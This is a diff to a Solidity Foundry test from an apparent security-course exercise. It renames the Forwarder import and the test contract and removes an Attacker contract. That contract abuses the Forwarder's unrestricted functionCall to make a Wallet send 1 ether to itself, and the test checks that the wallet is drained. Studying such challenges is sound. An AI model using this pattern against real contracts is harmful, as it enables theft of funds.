@@ -2,9 +2,9 @@
 pragma solidity ^0.8.0;
 
 import "forge-std/Test.sol";
-import "week10-11-security2/forwarder.sol";
+import "week10-11-security2/Forwarder.sol";
 
-contract TestForwarder is Test {
+contract ForwarderTest is Test {
     Forwarder forwarder;
     Wallet wallet;
     Attacker attacker;
@@ -33,30 +33,5 @@ contract TestForwarder is Test {
     function _checkCompleted() internal {
         assertEq(address(wallet).balance, 0);
         assertEq(address(attacker).balance, 1 ether);
-    }
-}
-
-contract Attacker {
-    Forwarder forwarder;
-    Wallet wallet;
-
-    constructor(Forwarder forwarder_, Wallet wallet_) {
-        forwarder = forwarder_;
-        wallet = wallet_;
-    }
-
-    receive() external payable {
-        console.log("recieve()", msg.value);
-    }
-
-    function attack() public {
-        forwarder.functionCall(
-            address(wallet),
-            abi.encodeWithSelector(
-                Wallet.sendEther.selector,
-                address(this),
-                1 ether
-            )
-        );
     }
 }
